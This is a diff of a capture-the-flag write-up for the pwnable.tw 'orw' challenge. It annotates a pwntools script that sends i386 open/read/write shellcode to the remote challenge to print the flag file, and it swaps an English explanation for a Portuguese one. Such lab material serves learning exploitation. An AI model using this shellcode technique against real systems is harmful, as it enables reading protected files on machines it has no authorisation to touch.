@@ -102,22 +102,26 @@ Dump of assembler code for function main:
 
 <pre>
 <code>from pwn import *
+# Imports the pwntools library, used to build exploits and communicate with vulnerable binaries.
 
 r = remote('chall.pwnable.tw', 10001)
-
+# Establishes a connection to the remote server (chall.pwnable.tw) on port 10001, where the target binary is running.
+    
 sc = asm(
-shellcraft.i386.linux.open('/home/orw/flag') +
-shellcraft.i386.linux.read('eax', 'esp', 50) +
-shellcraft.i386.linux.write('1', 'esp', 50)
+shellcraft.i386.linux.open('/home/orw/flag') +   # Generates shellcode to open the file '/home/orw/flag'.
+shellcraft.i386.linux.read('eax', 'esp', 50) +   # Reads the contents of the file (eax contains the file descriptor).
+shellcraft.i386.linux.write(1, 'esp', 50)        # Writes the read content to standard output (fd = 1).
 )
-
+# The shellcode generated above performs three operations: opening the file, reading the contents, and writing to the output.
+    
 r.send(sc)
-r.interactive()</code>
+# Sends shellcode to the remote program that is waiting for shellcode input.
+    
+r.interactive()
+# Maintains the interactive connection, allowing the user to interact directly with the remote program.</code>
 </pre>
-
-<p>The exploit basically establishes a connection to a remote service and sends shellcode that, when executed, opens a file containing the flag, reads its contents, and writes it to standard output. The flag is then captured and displayed. The use of shellcode and direct stack manipulation makes the exploit possible and efficient.</p>
-</div>
-
+<p>O exploit basicamente estabelece uma conexão com um serviço remoto e envia um shellcode que, quando executado, abre um arquivo contendo a flag, lê seu conteúdo e escreve na saída padrão. A flag é então capturada e exibida. O uso do shellcode e a manipulação direta da pilha tornam a exploração possível e eficiente.</p>
+        
 <h2>Flag</h2>
 
 <pre>
